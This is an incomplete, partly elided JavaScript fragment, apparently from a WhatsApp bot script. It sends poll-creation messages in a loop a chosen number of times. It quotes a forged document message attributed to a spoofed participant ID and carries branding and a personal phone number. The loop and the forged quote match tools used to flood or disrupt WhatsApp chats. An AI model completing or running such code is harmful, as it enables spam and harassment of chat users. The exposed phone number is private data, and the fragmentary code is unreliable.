...
const ydd = `Hallo Aku ᴀᴍꜱᴀʟ`
for (let i = 0; i < jumlah; i++) {
var pollCreation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"pollCreationMessage": {
"name": "HALO 👋 SAYA ᴀᴍꜱᴀʟ",
"options": [
{
...
{
"optionName": "SALAM BROTHER BY © ᴀᴍꜱᴀʟ"
}
],
...
let dok = {key : {participant : '0@s.whatsapp.net'},message: {documentMessage: {title: `© ᴀᴍꜱᴀʟ`,jpegThumbnail: miku}}}
...
"retailerId": `ᴀᴍꜱᴀʟ⿻ꫂ`,
"url": "wa.me/6283845012413"
},
"businessOwnerJid": "6283845012413@s.whatsapp.net",
}
}), { userJid: m.chat, quoted: bdoc })
